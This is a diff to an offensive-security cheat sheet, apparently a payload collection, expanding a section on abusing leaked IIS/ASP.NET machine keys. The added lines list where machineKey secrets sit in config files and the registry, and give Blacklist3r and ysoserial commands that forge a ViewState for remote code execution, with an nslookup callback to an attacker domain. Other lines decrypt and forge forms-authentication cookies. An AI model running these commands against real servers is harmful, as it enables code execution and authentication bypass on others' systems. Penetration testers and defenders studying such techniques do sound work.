@@ -17,7 +17,7 @@
     - [Twitter Bearer Token](#twitter-bearer-token)
     - [Gitlab Personal Access Token](#gitlab-personal-access-token)
     - [HockeyApp API Token](#hockeyapp-api-token)
-    - [Auth Bypass using pre-published Machine Key](#auth-bypass-using-pre-published-machine-key)
+    - [IIS Machine Keys](#iis-machine-keys)
     - [Mapbox API Token](#Mapbox-API-Token)
 
 
@@ -99,11 +99,14 @@ curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hoc
 ```
 
 
-### Auth Bypass using pre-published Machine Key
+### IIS Machine Keys
 
-> By default, ASP.NET creates a Forms Authentication Ticket with unique a username associated with it, Date and Time at which the ticket was issued and expires. So, all you need is just a unique username and a machine key to create a forms authentication token
+> That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
 
-That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
+Requirements
+* machineKey **validationKey** and **decryptionKey**
+* __VIEWSTATEGENERATOR cookies
+* __VIEWSTATE cookies
 
 Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.
 
@@ -111,7 +114,40 @@ Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/s
 <machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
 ```
 
+Common locations of **web.config** / **machine.config**
+* 32-bit
+    * C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
+    * C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config
+* 64-bit
+    * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
+    * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config
+* in registry when **AutoGenerate** is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)
+    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4  
+    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey
+
 Exploit with [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)
+
+#### Identify known machine key
+
+```powershell
+AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
+```
+
+
+#### Generate ViewState for RCE
+
+**NOTE**: In Burp you should **URL Encode Key Characters** for your payload.
+
+```powershell
+ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
+```
+
+
+#### Edit cookies with the machine key
+
+If you have the machineKey but the viewstate is disabled.
+
+ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools
 
 ```powershell
 # decrypt cookie
@@ -120,7 +156,6 @@ $ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX 
 # encrypt cookie (edit Decrypted.txt)
 $ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
 ```
-
 
 ### Mapbox API Token
 A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.
